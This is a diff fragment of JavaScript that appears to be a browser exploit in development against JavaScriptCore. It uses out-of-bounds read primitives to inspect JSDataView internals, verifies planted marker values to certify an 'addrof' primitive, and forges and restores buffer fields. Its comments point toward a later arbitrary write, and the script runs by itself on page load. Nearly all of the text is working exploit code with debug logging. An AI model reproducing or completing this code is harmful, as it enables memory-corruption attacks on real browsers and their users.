+        else bs('WIT-V31-FORGE-nowrite');
+
+        for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);
+        bs('V31-RESTORED');
+
+        if(loadReturned){
+          verd('ok','v31 '+ARM+' RETURNED');
+          bs('V31-DONE-'+ARM+'-RETURNED');
+        }else{
+          verd('err','v31 '+ARM+' crashed');
+          bs('V31-DONE-'+ARM+'-CRASHED');
+        }
+      }
+
+    }else bs('V31-SKIP-bad-idx');
+  }else bs('V31-SKIP-missing-data');
+}catch(e29){bs('V31-ERR-'+String(e29&&e29.message?e29.message:'?'));}
+/* ==== v31 END ==== */
+
+
+
+          bs('PATHB-LINKAGE-PENDING-deterministic-carrier/addrof-linkage-still-missing');
+
+          /* --- optional ?dv=<hex> JSDataView candidate cell certification --- */
+          /* --- JSDataView candidate certification: manual ?dv= takes priority,
+           * else the V13 auto-found candidates (CELLC, up to 4) — each fully
+           * verified in order; first success certifies and caches. --- */
+          var cellCandsL=(DVQ!==0n)?[DVQ]:((typeof CELLC!=='undefined'&&CELLC.length>0)?CELLC.slice():[]);
+          if(cellCandsL.length===0){
+            bs('ADDROF-PENDING-target-DataView-allocated-but-JSCell-not-auto-discovered');
+          }else{
+            for(var cIdx=0;cIdx<cellCandsL.length;cIdx++){
+              var cell=cellCandsL[cIdx];
+              bs('DV-candidate-'+cIdx+'-cell='+hex(cell));
+              var dvH=readAt(cell,64); /* covers +0x18 m_length and +0x20 m_byteOffset */
+              dumpQ('DVHDR'+cIdx,dvH,64);
+              var dvButterfly=qAt(dvH,0x08);
+              var dvVector=qAt(dvH,0x10);
+              var dvLength=qAt(dvH,0x18);
+              var dvByteOff=qAt(dvH,0x20);
+              bs('DV'+cIdx+'-butterfly08='+hex(dvButterfly)+'-vector10='+hex(dvVector)+'-length18='+hex(dvLength)+'-byteOffset20='+hex(dvByteOff));
+              var hdrOK=(dvButterfly===0n)&&canonHeap(dvVector)&&(dvLength===0x40n)&&(dvByteOff===0x20n);
+              if(!hdrOK){bs('CAND-'+cIdx+'-HDR-FAIL');continue;}
+
+              /* Prove the vector by reading each exact 8B marker at its own
+               * address with FRESH reads (never one assumed contiguous read). */
+              var V=dvVector;
+              var mC=0x55AA33CC0FF0E11En, mA=0x13579BDF02468ACEn, mB=0x2468ACE013579BDFn;
+              var mD=0x0D15EA5EC001D00Dn, mE=0xDEADBEEFCAFEBABEn, mF=0x0123456789ABCDEFn;
+              var checks=[
+                ['C', V-8n,      mC],
+                ['A', V,         mA],
+                ['B', V+0x38n,   mB],
+                ['D', V+0x40n,   mD],
+                ['E', V-0x20n,   mE],
+                ['F', V+0xD8n,   mF]  /* final 8B of the 0x100 alloc; never 16 there */
+              ];
+              var allOK=true;
+              for(var mk=0;mk<checks.length;mk++){
+                var nm=checks[mk][0],ad=checks[mk][1],ex=checks[mk][2];
+                var mh=readAt(ad,8);
+                var got=qAt(mh,0);
+                var ok=(got===ex);
+                if(!ok)allOK=false;
+                bs('DVMARK'+cIdx+'-'+nm+'-got='+hex(got)+'-expect='+hex(ex)+'-match='+ok);
+              }
+              if(!allOK){bs('CAND-'+cIdx+'-MARK-FAIL');continue;}
+              bs('ADDROF-CERTIFIED-cell='+hex(cell)+'-vectorFieldAddr='+hex(cell+0x10n)+'-realVector='+hex(V)+'-arrayBufferBase='+hex(V-0x20n));
+              try{localStorage.setItem('v688_cell',cell.toString(16));}catch(e5){}
+              /* Stop immediately after certification; never execute a write. */
+              bs('PATHB-DONE-read-only-no-write-performed');
+              verd('ok','ADDROF-CERTIFIED '+hex(cell));
+              return;
+            }
+            bs('ADDROF-FAIL-all-candidates-rejected-n='+cellCandsL.length);
+          }
+
+          bs('PATHB-DONE-read-only-identity-probe');
+          bs('PATHB-NOTE-not-a-valid-COOP-arbitrary-write-yet; ResolveCallback semantics + deterministic JSC addrof linkage still needed; p812/p813 source-only');
+          verd('ok','Path B identity probe done (read-only)');
+        },70);
+        /* ==== V688 STEP 9 END ==== */
+
+
+
+
+      },60); /* post ADD-OK */
+    },40); /* post FAMILY-OK */
+  },60); /* post FORGED */
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive')
+  setTimeout(function(){if(!/reset=1|soft=1/.test(location.search))setTimeout(start,DL);},0);
+else document.addEventListener('DOMContentLoaded',function(){if(!/reset=1|soft=1/.test(location.search))setTimeout(start,DL);});
